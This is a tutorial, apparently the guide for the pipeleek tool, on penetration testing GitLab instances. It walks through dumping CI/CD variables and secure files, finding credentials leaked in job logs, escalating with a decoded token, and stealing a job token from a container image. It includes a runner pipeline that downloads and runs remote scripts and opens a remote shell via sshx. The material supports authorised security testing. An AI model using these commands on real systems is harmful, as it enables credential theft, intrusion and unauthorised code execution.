---
title: A Starter Guide To GitLab Pentesting
description: An introduction to performing a basic penetration test against a GitLab instance.
keywords:
  - GitLab basic pentest
  - pipeline secrets scanning
  - GitLab credential leaks
  - CI/CD secrets discovery
  - pipeline secrets testing
---

# A Starter Guide To GitLab Pentesting

Many companies use (self-hosted) GitLab instances to manage their source codes, often exposing sensitive data through CI/CD pipelines. In times when a lot of infrastructure is deployed as code (IaC) these configurations must be source-controlled as well, putting a lot of responsibility on the source code platform used.

## Anonymous Access

If you do not have credentials for the GitLab instance you might want to look at the public repositories and test if you can sign up for an account.

You can list the public projects under the path `/explore` for example `https://leakycompany.com/explore`.

See if you can already identify potentially sensitive data e.g. credentials in source code or just generally repositories that should not be public.
[Trufflehog](https://github.com/trufflesecurity/trufflehog) is a great tool that automates this.

The next step would be to try to create an account. Head to `https://leakycompany.com/users/sign_up` and try to register a new account.
Sometimes you can only create an account with an email address managed by the customer, some instances require the admins to accept the register request, and others completely disable it.

## Authenticated Access

Sweet now you have access to the GitLab instance with an account.
The first thing to look out for: What projects do I have access to? Is it more than unauthenticated?
Some companies grant their developers `developer` access to each repository, this might become interesting.

> The main question: Is the access concept based on the least privilege principle?

## Known Vulnerabilities

Usually GitLab does disclose the installed version to auhtenticated users only.
You can check the version manually at `https://leakycompany.com/help`.

Using [pipeleek](https://github.com/CompassSecurity/pipeleek) we can automate this process and enumerates known vulnerabilities.
Make sure to verify manually as well.

> To create a Personal Access Token visit https://leakycompany.com/-/user_settings/personal_access_tokens

```bash
pipeleek gl vuln -g https://leakycompany.com -t glpat-[redacted]
2024-11-14T14:29:05+01:00 info GitLab version=17.5.1-ee
2024-11-14T14:29:05+01:00 info Fetching CVEs for this version version=17.5.1-ee
```

## Enumerating CI/CD Variables And Secure Files

If you already have access to projects and groups you can try to enumerate CI/CD variables and use these for potential privilege escalation/lateral movement paths.

Dump all CI/CD variables you have access to, to find more secrets.

```bash
# Dump variables defined in the projects settings
pipeleek gl variables -g https://leakycompany.com -t glpat-[redacted]

# Schedules can have separately defined variables
pipeleek gl schedule -g https://leakycompany.com -t glpat-[redacted]

# Secure files are an alternative to variables and often times contain sensitive info
pipeleek gl secureFiles  --gitlab https://leakycompany.com --token glpat-[redacted]
2024-11-18T15:38:08Z info Fetching project variables
2024-11-18T15:38:09Z warn Secure file content="this is a secure file!!" downloadUrl=https://leakycompany.com/api/v4/projects/60367314/secure_files/9149327/download
2024-11-18T15:38:12Z info Fetched all secure files
```

## Secret Detection in Source Code

Manually looking for sensitive info can be cumbersome and should be partially automated.

Use Trufflehog to find hardcoded secrets in the source code:

```bash
trufflehog gitlab --token=glpat-[redacted]
```

Note: this only scanned repository you have access to. You can specify single repositories as well.

## Secret Detection in Pipelines And Artifacts

Nowadays most repositories make use of CI/CD pipelines. A config file per repository `.gitlab-ci.yml` defines what jobs are executed.

Many problems can arise when misconfiguring these.

- People print sensitive environment variables in the (sometimes public) job logs
- Debug logs contain sensitive information e.g. private keys or personal access tokens
- Created artifacts contain sensitive stuff

**A few job output logs examples found in the wild:**

```bash
# Example 0
# Variations of this include e.g. `printenv`, `env` commands etc.
$ echo $AWS_ACCESS_KEY_ID
AKI[redacted]
$ echo $AWS_SECRET_ACCESS_KEY
[redacted]
$ echo $S3_BUCKET
some-bucket-name
$ aws configure set region us-east-1
$ aws s3 cp ./myfile s3://$S3_BUCKET/$ARTIFACT_NAME
upload: target/myfile to s3://some-bucket-name/myfile

# Example 1
$ mkdir -p ./creds
$ echo $GCLOUD_SERVICE_KEY | base64 -d > ./creds/serviceaccount.json
$ echo $GCLOUD_SERVICE_KEY
[redacted]
$ cat ./creds/serviceaccount.json
{
  "type": "service_account",
  "project_id": "[redacted]",
  "private_key_id": "[redacted]",
  "private_key": "-----BEGIN PRIVATE KEY-----[redacted]-----END PRIVATE KEY-----\n",
  "client_email": "[redacted].iam.gserviceaccount.com",
  "client_id": "[redacted]",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "[redacted]",
  "universe_domain": "googleapis.com"
}
$ terraform init
Initializing the backend...
Successfully configured the backend "[redacted]"! Terraform will automatically
use this backend unless the backend configuration changes.

# Example 2
$ git remote set-url origin "${CI_REPOSITORY_URL}"
Executing "step_script" stage of the job script
$ eval $(ssh-agent -s)
Agent pid 13
$ echo "$PRIVATE_KEY"
-----BEGIN OPENSSH PRIVATE KEY-----
[redacted]
```

There are many reasons why credentials might be included in the job output. Moreover, it is important to review generated artifacts as well. It is possible that credentials are not logged in the output but later saved in artifacts, that can be downloaded.

**Automating Pipeline Credential Leaks**

[Pipeleek](https://github.com/CompassSecurity/pipeleek) can be used to scan for credentials in the job outputs.

```bash
$ pipeleek gl scan --token glpat-[redacted] --gitlab https://gitlab.example.com -c [gitlab session cookie]]  -v -a -j 5 --confidence high-verified,high
2024-09-26T13:47:09+02:00 debug Verbose log output enabled
2024-09-26T13:47:10+02:00 info Gitlab Version Check revision=2e166256199 version=17.5.0-pre
2024-09-26T13:47:10+02:00 debug Setting up queue on disk
2024-09-26T13:47:10+02:00 debug Using DB file file=file:///tmp/pipeleek-queue-db-60689531:?_journal=WAL&_timeout=5000&_fk=true
2024-09-26T13:47:10+02:00 debug Loading rules.yml from filesystem
2024-09-26T13:47:10+02:00 debug Applying confidence filter filter=high-verified,high
2024-09-26T13:47:10+02:00 debug Loaded filtered rules count=882
2024-09-26T13:47:10+02:00 info Fetching projects
2024-09-26T13:47:10+02:00 info Provided GitLab session cookie is valid
2024-09-26T13:47:15+02:00 debug Fetch Project jobs for url=https://gitlab.example.com/legendaryleo/WebRTC_Source
2024-09-26T13:47:15+02:00 debug Fetch Project jobs for url=https://gitlab.example.com/himanshu8443/fdroiddata
[redacted]
```

Review the findings manually and tweak the flags according to your needs.

If you found any valid credentials, e.g. personal access tokens, cloud credentials, and so on, check if you can move laterally or escalate privileges.

### An example of privilege escalation

Pipeleek identified the following based64 encode secret in the environment variable `CI_REPO_TOKEN`:

```bash
CI_SERVER=yes
CI_REPO_TOKEN=Z[redacted]s=
FF_SET_PERMISSIONS_BEFORE_CLEANUP=true
CI_COMMIT_SHORT_SHA=998068b1
```

Decoding it shows that it is a GitLab personal access token, which is valid.

```bash
# Decoding the PAT
$ base64 -d
Z[redacted]s=
glpat-[remvoed]

# Verify using the API
curl --request GET --header "PRIVATE-TOKEN: glpat-[redacted]" https://gitlab.example.com/api/v4/user/ | jq

{
  "id": [redacted],
  "username": "pipeleek_user",
  "name": "testToken",
  "state": "active",
  "locked": false,
  [redacted]
}

# Verify using Pipeleek
pipeleek gl enum -g https://gitlab.example.com -t glpat-[redacted]
2025-09-29T12:25:51Z info Enumerating User
2025-09-29T12:25:51Z warn Current user admin=false bot=false email=test@example.com name="Pipe Leak" username=pipeleek_user
2025-09-29T12:25:51Z info Enumerating Access Token
2025-09-29T12:25:51Z warn Current Token active=true created=2025-09-29T12:25:20Z description=test id=14839115 lastUsedAt=2025-09-29T12:25:51Z lastUsedIps= name=testToken revoked=false scopes=read_api userId=14918432
2025-09-29T12:25:51Z info Enumerating Projects and Groups
2025-09-29T12:25:52Z warn Group accessLevel=50 group=https://gitlab.example.com/groups/example-group name=example-project visibility=private
2025-09-29T12:25:52Z warn Project groupAccessLevel=50 name="example-group / another project" project=https://gitlab.example.com/example-group/another-project projectAccessLevel=0
2025-09-29T12:25:52Z info Done
```

Abusing this access token grants you access to the `another-project` repository, thus you escalated privileges to this repository.

## Attacking Runners

Chances are high that if pipelines are used, custom runners are registered. These come in different flavors. Most of the time the docker executor is used, which allows pipelines to define container images in which their commands are executed. For a full list of possibilities [rtfm](https://docs.gitlab.example.com/runner/executors/).

If you can create projects or contribute to existing ones, you can interact with runners. We want to test if it is possible to escape from the runner context e.g. escape from the container to the host machine or if the runner leaks additional privileges e.g. in the form of attached files or environment variables set by the runner config.

First, you need to enumerate what (shared) runners are available.
Doing this manually by creating a project or navigating to an existing one.
Open the CI/CD Settings page and look at the Runners section: https://leakycompany.com/my-pentest-prject/-/settings/ci_cd
Runners can be attached globally, on the group level or on individual projects.

Using pipeleek we can automate runner enumeration:

```bash
$ pipeleek gl runners --token glpat-[redacted] --gitlab https://gitlab.example.com -v list
2024-09-26T14:26:54+02:00 info group runner description=2-green.shared-gitlab-org.runners-manager.gitlab.example.com name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org type=instance_type
2024-09-26T14:26:55+02:00 info group runner description=3-green.shared-gitlab-org.runners-manager.gitlab.example.com/dind name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org-docker type=instance_type
2024-09-26T14:26:55+02:00 info group runner description=blue-3.saas-linux-large-amd64.runners-manager.gitlab.example.com/default name=comp-test-ia paused=false runner=gitlab-runner tags=saas-linux-large-amd64 type=instance_type
2024-09-26T14:26:55+02:00 info group runner description=green-1.saas-linux-2xlarge-amd64.runners-manager.gitlab.example.com/default name=comp-test-ia paused=false runner= tags=saas-linux-2xlarge-amd64 type=instance_type
2024-09-26T14:26:55+02:00 info Unique runner tags tags=gitlab-org,saas-linux-large-arm64,windows,gitlab-org-docker,e2e-runner2,saas-macos-large-m2pro,saas-linux-xlarge-amd64,saas-linux-small-amd64,saas-linux-2xlarge-amd64,saas-linux-medium-amd64,saas-windows-medium-amd64,e2e-runner3,saas-linux-medium-arm64,saas-linux-medium-amd64-gpu-standard,saas-macos-medium-m1,shared-windows,saas-linux-large-amd64,windows-1809
2024-09-26T14:26:55+02:00 info Done, Bye Bye 🏳️‍🌈🔥
```

Review the runners and select the interesting ones. The Gitlab Ci/CD config file allows you to select runners by their tags. Thus we create a list of the most interesting tags, printed by the command above.

Pipeleek can generate a `.gitlab-ci.yml` or directly create a project and launch the jobs.

```bash
# Manual creation
$ pipeleek gl runners --token glpat-[redacted] --gitlab https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell --dry
2024-09-26T14:32:26+02:00 debug Verbose log output enabled
2024-09-26T14:32:26+02:00 info Generated .gitlab-ci.yml
2024-09-26T14:32:26+02:00 info ---
stages:
    - exploit
pipeleek-job-saas-linux-small-amd64:
    stage: exploit
    image: ubuntu:latest
    before_script:
        - apt update && apt install curl -y
    script:
        - echo "Pipeleek exploit job"
        - id
        - whoami
        - curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
        - chmod +x deepce.sh
        - ./deepce.sh
        - curl -sSf https://sshx.io/get | sh -s run
    tags:
        - saas-linux-small-amd64

2024-09-26T14:32:26+02:00 info Create you project and .gitlab-ci.yml manually
2024-09-26T14:32:26+02:00 info Done, Bye Bye 🏳️‍🌈🔥

# Automated
$ pipeleek gl runners --token glpat-[redacted]  --gitlab https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell
2024-09-26T14:33:48+02:00 debug Verbose log output enabled
2024-09-26T14:33:49+02:00 info Created project name=pipeleek-runner-exploit url=https://gitlab.example.com/[redacted]/pipeleek-runner-exploit
2024-09-26T14:33:50+02:00 info Created .gitlab-ci.yml file=.gitlab-ci.yml
2024-09-26T14:33:50+02:00 info Check pipeline logs manually url=https://gitlab.example.com/[redacted]/pipeleek-runner-exploit/-/pipelines
2024-09-26T14:33:50+02:00 info Make sure to delete the project when done
2024-09-26T14:33:50+02:00 info Done, Bye Bye 🏳️‍🌈🔥
```

If you check the log output you can see the outputs of the commands defined in `script` and an [sshx](https://sshx.io/) Url which gives you an interactive shell in your runner.

```bash
$ echo "Pipeleek exploit job"
Pipeleek exploit job
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
$ curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
$ chmod +x deepce.sh
$ ./deepce.sh

==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
[redacted]

$ curl -sSf https://sshx.io/get | sh -s run
↯ Downloading sshx from https://s3.amazonaws.com/sshx/sshx-x86_64-unknown-linux-musl.tar.gz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2971k  100 2971k    0     0  7099k      0 --:--:-- --:--:-- --:--:-- 7109k
↯ Adding sshx binary to /tmp/tmp.zky0trhv9m
↯ Done! You can now run sshx.
  sshx v0.2.5
  ➜  Link:  https://sshx.io/s/Vg[redacted]
  ➜  Shell: /bin/bash
```

From the interactive shell, you can now try breakout to the host, or find runner misconfigurations e.g. host mounted volumes.

## Scanning Container Registries

If the GitLab instance has a container registry enabled, check if you have access to pull container images. These images often contain hardcoded secrets, credentials, or sensitive configuration files that were accidentally included during the build process.

Using [TruffleHog](https://github.com/trufflesecurity/trufflehog):

```bash
trufflehog docker --image registry.leakycompany.com/auser/arepo
```

## Artipacked

GitLab CI/CD pipelines automatically create a job [token](https://docs.gitlab.example.com/ci/jobs/ci_job_token/). It is used for operations like cloning the repository or pulling from the container registry. The token is scoped and does not grant full API access. It is only valid during the job run and revoked when the job finishes.

If you can recover a valid job token, you may be able to clone a repository or publish malicious artifacts. See the [docs](https://docs.gitlab.example.com/ci/jobs/ci_job_token/) for details.

GitLab populates `.git/config` with a job token during CI clones. If a later step publishes that file, the token can leak. Common causes are broad container build copy statements that bundle `.git` into an image or release builds that accidentally ship the `.git` directory. If a race exists between publishing and job completion (token revocation), you can abuse the token.

In this example we scan for container builds that include too many files (including the `.git` folder).

```bash
pipeleek gl container artipacked -o
2026-02-09T14:54:52Z info Loaded container scan patterns pattern_count=4
2026-02-09T14:54:52Z info Fetching projects
2026-02-09T14:54:56Z info Identified content="COPY . ." file=Containerfile is_multistage=false url=https://gitlab.example.com/auser/artipacked
```

The detected Containerfile copies the full working directory and then pushes the image into the GitLab container registry.

From the `gitlab-ci.yml` excerpt, the registry push is followed by a `sleep`. This means the published container image contains a job token that remains valid until the `sleep` finishes.

```yml
build-artipacked-container:
  stage: build
  image: quay.io/buildah/stable:latest
  variables:
    IMAGE_NAME: $CI_REGISTRY_IMAGE:latest
    STORAGE_DRIVER: vfs
  rules:
    - if: $CI_COMMIT_BRANCH
  script:
    - buildah login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" "$CI_REGISTRY"
    - buildah bud -f Containerfile -t "$IMAGE_NAME" .
    - buildah push "$IMAGE_NAME"
    - sleep 3500
    - echo "Finished container"
```

You can now pull the published image and extract the job token as long as the job is still running.

```bash
docker pull registry.gitlab.example.com/auser/artipacked:latest
latest: Pulling from auser/artipacked
7319607d119c: Already exists
473766943e5c: Pull complete
Digest: sha256:bb8ad10d8fe0f531516e9a2277ec1cd4985956a7d90adece165437520132a9fe
Status: Downloaded newer image for registry.gitlab.example.com/auser/artipacked:latest
registry.gitlab.example.com/auser/artipacked:latest

docker run --rm --entrypoint sh registry.gitlab.example.com/auser/artipacked:latest -c "cat .git/config"
[init]
        defaultBranch = none
[fetch]
        recurseSubmodules = false
[credential]
        interactive = never
[gc]
        autoDetach = false
[include]
        path = /builds/auser/artipacked.tmp/.gitlab-runner.ext.conf
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = https://gitlab-ci-token:glcbt-6c_z1CoZjUyFfAu6cE2XFTC@gitlab.example.com/auser/artipacked.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[lfs]
        repositoryformatversion = 0
```

Then validate and create PoC exploit:

```bash
pipeleek gl jobToken exploit --project auser/artipacked --token glcbt-6c_z1CoZjUyFfAu6cE2XFTC
2026-02-09T15:25:30Z info Job token validation succeeded
2026-02-09T15:25:30Z info Job token context resolved job_id=13042619352 project=auser/artipacked project_id=79339419 ref=main status=running web_url=https://gitlab.example.com/auser/artipacked/-/jobs/13042619352
2026-02-09T15:25:30Z info Fetching secure files project=auser/artipacked
2026-02-09T15:25:31Z info Saved secure file bytes=19 name=secure.txt path=secure-files/secure.txt
2026-02-09T15:25:34Z info Created jobToken exploit branch branch=pipeleek-663f51b4 project=https://gitlab.example.com/auser/artipacked
2026-02-09T15:25:34Z info Review branch changes url=https://gitlab.example.com/auser/artipacked/-/tree/pipeleek-663f51b4
```

The command verified the token, downloaded existing secure files and actually pushed a change to the repo. Pushing does not work in default settings, only if the maintainers [allowed](https://docs.gitlab.com/ci/jobs/ci_job_token/#allow-git-push-requests-to-your-project-repository) repository push for the job token.
